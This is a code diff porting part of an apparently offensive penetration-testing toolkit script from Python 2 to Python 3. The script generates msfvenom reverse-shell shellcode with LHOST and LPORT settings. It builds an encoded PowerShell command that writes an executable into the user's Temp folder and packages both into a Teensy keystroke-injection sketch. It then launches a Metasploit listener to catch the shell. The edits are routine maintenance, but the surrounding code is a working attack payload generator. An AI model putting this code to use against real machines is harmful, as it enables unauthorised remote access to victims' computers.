@@ -136,17 +136,14 @@ print_status("Generating alpha_mixed shellcode to be injected after shellexec ha
 # grab msfvenom alphanumeric shellcode to be inserted into shellexec
 proc = subprocess.Popen("%smsfvenom -p %s EXITFUNC=thread LHOST=%s LPORT=%s %s --format raw -e x86/alpha_mixed BufferRegister=EAX" % (meta_path(),payload,ipaddr,port,url), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
 # read in stdout which will be our alphanumeric shellcode
-alpha_payload = proc.stdout.read()
+alpha_payload = proc.stdout.read().decode("latin-1")
 # generate a random filename this is going to be needed to read 150 bytes in at a time
 random_filename = generate_random_string(10,15)
 # prep a file to write
-filewrite = file(random_filename, "wb")
-# write the hex to random file
-filewrite.write(shell_exec)
-# close it
-filewrite.close()
+with open(random_filename, "w", encoding="ascii") as filewrite:
+    filewrite.write(shell_exec)
 # open up the random file
-fileopen=file(random_filename, "r")
+fileopen = open(random_filename, "r", encoding="ascii")
 # base counter will be used for the const char RevShell_counter
 counter = 0
 # space to write out per line in the teensy ino file
@@ -157,7 +154,7 @@ rev_counter = 0
 output_variable = "/* Teensy Hex to File Created by Josh Kelley (winfang) and Dave Kennedy (ReL1K) - file ext changed to .ino and prog_char & PROGMEM modified */\n#include <avr/pgmspace.h>\n"
 
 # powershell command here, needs to be unicoded then base64 in order to use encodedcommand
-powershell_command = unicode("$s=gc \"$HOME\\AppData\\Local\\Temp\\%s\";$s=[string]::Join('',$s);$s=$s.Replace('`r',''); $s=$s.Replace('`n','');$b=new-object byte[] $($s.Length/2);0..$($b.Length-1)|%%{$b[$_]=[Convert]::ToByte($s.Substring($($_*2),2),16)};[IO.File]::WriteAllBytes(\"$HOME\\AppData\\Local\\Temp\\%s.exe\",$b)" % (random_filename,random_filename))
+powershell_command = "$s=gc \"$HOME\\AppData\\Local\\Temp\\%s\";$s=[string]::Join('',$s);$s=$s.Replace('`r',''); $s=$s.Replace('`n','');$b=new-object byte[] $($s.Length/2);0..$($b.Length-1)|%%{$b[$_]=[Convert]::ToByte($s.Substring($($_*2),2),16)};[IO.File]::WriteAllBytes(\"$HOME\\AppData\\Local\\Temp\\%s.exe\",$b)" % (random_filename,random_filename)
 
 ########################################################################################################################################################################################################
 #
@@ -176,7 +173,7 @@ for char in powershell_command:
 # assign powershell command as the new one
 powershell_command = blank_command
 # base64 encode the powershell command
-powershell_command = base64.b64encode(powershell_command)
+powershell_command = base64.b64encode(powershell_command.encode("utf-8")).decode("ascii")
 
 # while true
 while 1:
@@ -313,25 +310,22 @@ Keyboard.set_key1(0);
 Keyboard.send_now();
 }""" % (random_filename,random_filename,powershell_command,vbs,bat,vbs,vbs,random_filename,alpha_payload,bat,vbs))
 # delete temporary file
-subprocess.Popen("rm %s 1> /dev/null 2>/dev/null" % (random_filename), shell=True).wait()
+if os.path.isfile(random_filename):
+    os.remove(random_filename)
 if not os.path.isdir(userconfigpath + "reports"): os.makedirs(userconfigpath + "reports")
 print_status("Binary to Teensy file exported as %sreports/binary2teensy" % (userconfigpath))
 # write the teensy.ino file out
-filewrite = file(userconfigpath + "reports/binary2teensy.ino", "w")
-# write the teensy.ino file out
-filewrite.write(output_variable)
-# close the file
-filewrite.close()
+with open(userconfigpath + "reports/binary2teensy.ino", "w", encoding="utf-8") as filewrite:
+    filewrite.write(output_variable)
 print_status("Generating a listener...")
 # create our metasploit answer file
-filewrite = file(userconfigpath + "answer.txt", "w")
-filewrite.write("use multi/handler\nset payload %s\nset LHOST %s\nset LPORT %s\n%s\nexploit -j" % (payload,ipaddr,port,url))
-filewrite.close()
+answer_path = userconfigpath + "answer.txt"
+with open(answer_path, "w", encoding="utf-8") as filewrite:
+    filewrite.write("use multi/handler\nset payload %s\nset LHOST %s\nset LPORT %s\n%s\nexploit -j" % (payload,ipaddr,port,url))
 # spawn a multi/handler listener
-subprocess.Popen("msfconsole -r %sanswer.txt" % (userconfigpath), shell=True).wait()
+subprocess.Popen(["msfconsole", "-r", answer_path]).wait()
 print_status("[*] Housekeeping old files...")
 # if our answer file is still there (which it should be), then remove it
-if os.path.isfile(userconfigpath + "answer.txt"):
+if os.path.isfile(answer_path):
     # remove the old file, no longer used once we've exited
-    subprocess.Popen("rm " + userconfigpath + "answer.txt", shell=True).wait()
-
+    os.remove(answer_path)
